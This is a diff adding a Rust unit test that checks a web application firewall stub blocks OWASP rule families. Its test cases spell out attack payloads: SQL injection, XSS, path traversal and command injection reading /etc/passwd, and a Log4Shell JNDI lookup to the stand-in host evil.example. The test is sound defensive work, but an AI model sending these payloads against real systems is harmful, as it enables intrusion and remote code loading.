@@ -472,4 +472,50 @@ mod tests {
             ProvenEngineOutcome::Clean
         );
     }
+
+    /// Issue #11: the hermetic battery must cover each OWASP CRS family the
+    /// live-gateway evidence test fires, including percent-encoded variants,
+    /// and must attribute overlapping command+traversal payloads to the RCE
+    /// rule (first-match ordering).
+    #[test]
+    fn stub_engine_battery_matches_each_owasp_family() {
+        let engine = load_stub_engine();
+        let cases: &[(&str, i32)] = &[
+            ("/app?q=%27%20OR%20%271%27%3D%271", 942100),
+            ("/app?q=union%20select", 942100),
+            ("/app?q=%3Cscript%3Ealert(1)%3C/script%3E", 941100),
+            ("/app?q=..%2F..%2Fetc%2Fpasswd", 930100),
+            ("/app?file=../../etc/passwd", 930100),
+            ("/app?cmd=%3B%20cat%20/etc/passwd", 932100),
+            ("/app?x=%24%7BJNDI%3Aldap%3A//evil.example/a%7D", 944120),
+        ];
+        for (uri, expected_rule) in cases {
+            match engine.evaluate("GET", uri, "", None) {
+                ProvenEngineOutcome::Hit(hit) => {
+                    assert_eq!(hit.action, "block", "{uri}");
+                    assert!(
+                        hit.reason.contains(&expected_rule.to_string()),
+                        "{uri} must cite rule {expected_rule}: {}",
+                        hit.reason
+                    );
+                }
+                other => panic!("{uri} expected hit, got {other:?}"),
+            }
+        }
+        // POST bodies flow through the same engine surface.
+        match engine.evaluate("POST", "/app/comment", "comment=<script>x</script>", None) {
+            ProvenEngineOutcome::Hit(hit) => {
+                assert!(hit.reason.contains("941100"), "{}", hit.reason);
+            }
+            other => panic!("body XSS expected hit, got {other:?}"),
+        }
+        // Benign traffic stays clean.
+        for uri in ["/app?q=hello", "/healthz", "/api/events"] {
+            assert_eq!(
+                engine.evaluate("GET", uri, "", None),
+                ProvenEngineOutcome::Clean,
+                "benign {uri} must stay clean"
+            );
+        }
+    }
 }
